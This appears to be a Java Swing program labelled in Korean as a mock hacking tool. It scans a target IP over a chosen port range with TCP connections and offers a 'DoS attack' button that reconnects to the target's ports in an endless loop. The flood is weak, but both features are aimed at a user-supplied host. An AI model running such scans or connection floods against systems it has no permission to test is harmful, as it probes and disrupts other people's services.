import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.Socket;
import java.util.List;
import java.io.FileWriter;
import java.io.IOException;


public class HackingToolFrame extends JFrame {
    private JTextField inputTextField;
    private JTextField portRangeStartField;
    private JTextField portRangeEndField;
    private JTextArea outputArea;
    private JButton attackButton;
    private JButton dosButton;

    public HackingToolFrame() {
        setTitle("모의 해킹툴");
        setSize(700, 500);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(new BorderLayout());

        JPanel topPanel = new JPanel();
        topPanel.setLayout(new FlowLayout());


        JLabel targetLabel = new JLabel("대상 IP");
        inputTextField = new JTextField(15);

        JLabel startPortLabel = new JLabel("포트 시작");
        portRangeStartField = new JTextField(5);

        JLabel endPortLabel = new JLabel("포트 끝");
        portRangeEndField = new JTextField(5);

        attackButton = new JButton("포트 스캔 시작");
        dosButton = new JButton("DoS 공격 시작");

        topPanel.add(targetLabel);
        topPanel.add(inputTextField);
        topPanel.add(startPortLabel);
        topPanel.add(portRangeStartField);
        topPanel.add(endPortLabel);
        topPanel.add(portRangeEndField);
        topPanel.add(attackButton);
        topPanel.add(dosButton);

        add(topPanel, BorderLayout.NORTH);

        outputArea = new JTextArea();
        outputArea.setEditable(false);
        JScrollPane scrollPane = new JScrollPane(outputArea);

        add(scrollPane, BorderLayout.CENTER);

        attackButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                startPortScan();
            }
        });

        dosButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                startDosAttack();
            }
        });
    }

    private void startPortScan() {
        String target = inputTextField.getText();
        String startPortStr = portRangeStartField.getText();
        String endPortStr = portRangeEndField.getText();

        if (target.isEmpty() || startPortStr.isEmpty() || endPortStr.isEmpty()) {
            JOptionPane.showMessageDialog(this, "모든 필드를 입력해주세요.");
            return;
        }

        int startPort;
        int endPort;
        try {
            startPort = Integer.parseInt(startPortStr);
            endPort = Integer.parseInt(endPortStr);
            if (startPort < 0 || endPort > 65535 || startPort > endPort) {
                throw new NumberFormatException("포트 번호가 유효하지 않습니다.");
            }
        } catch (NumberFormatException e) {
            JOptionPane.showMessageDialog(this, "올바른 포트 번호를 입력해주세요.");
            return;
        }

        outputArea.setText("");
        outputArea.append("포트 스캔 시작: " + target + "\n");

        new SwingWorker<Void, String>() {
            protected Void doInBackground() throws Exception {
                for (int port = startPort; port <= endPort; port++) {
                    try {
                        publish("포트 " + port + " 스캔 중...");
                        Socket socket = new Socket(target, port);
                        socket.close();
                        publish("포트 " + port + " ※열림※");
                    } catch (Exception e) {
                        publish("포트 " + port + " 닫힘");
                    }
                    Thread.sleep(200);  // 스캔 속도 조절
                }
                return null;
            }

            protected void process(List<String> chunks) {
                for (String chunk : chunks) {
                    outputArea.append(chunk + "\n");
                }
            }

            protected void done() {
                outputArea.append("포트 스캔 완료!\n");

                // 결과를 파일로 저장
                try (FileWriter writer = new FileWriter("port_scan_results.txt")) {
                    writer.write(outputArea.getText());
                } catch (IOException e) {
                    JOptionPane.showMessageDialog(HackingToolFrame.this, "파일 저장 중 오류 발생.");
                }
            }
        }.execute();
    }

    private void startDosAttack() {
        String target = inputTextField.getText();
        String startPortStr = portRangeStartField.getText();
        String endPortStr = portRangeEndField.getText();

        if (target.isEmpty() || startPortStr.isEmpty() || endPortStr.isEmpty()) {
            JOptionPane.showMessageDialog(this, "모든 필드를 입력해주세요.");
            return;
        }

        int startPort;
        int endPort;
        try {
            startPort = Integer.parseInt(startPortStr);
            endPort = Integer.parseInt(endPortStr);
            if (startPort < 0 || endPort > 65535 || startPort > endPort) {
                throw new NumberFormatException("포트 번호가 유효하지 않습니다.");
            }
        } catch (NumberFormatException e) {
            JOptionPane.showMessageDialog(this, "올바른 포트 번호를 입력해주세요.");
            return;
        }

        outputArea.setText("");
        outputArea.append("DoS 공격 시작: " + target + "\n");

        new SwingWorker<Void, String>() {
            protected Void doInBackground() throws Exception {
                for (int port = startPort; port <= endPort; port++) {
                    try {
                        while (true) { // 공격을 지속적으로 시도
                            publish("포트 " + port + "에 연결 시도 중...");
                            Socket socket = new Socket(target, port);
                            socket.close();
                            Thread.sleep(200); // 공격 속도 조절
                        }
                    } catch (IOException e) {
                        publish("포트 " + port + "에 대한 DoS 공격 실패");
                    }
                }
                return null;
            }

            protected void process(List<String> chunks) {
                for (String chunk : chunks) {
                    outputArea.append(chunk + "\n");
                }
            }

            protected void done() {
                outputArea.append("DoS 공격 완료!\n");
            }
        }.execute();
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> new HackingToolFrame().setVisible(true));
    }
}
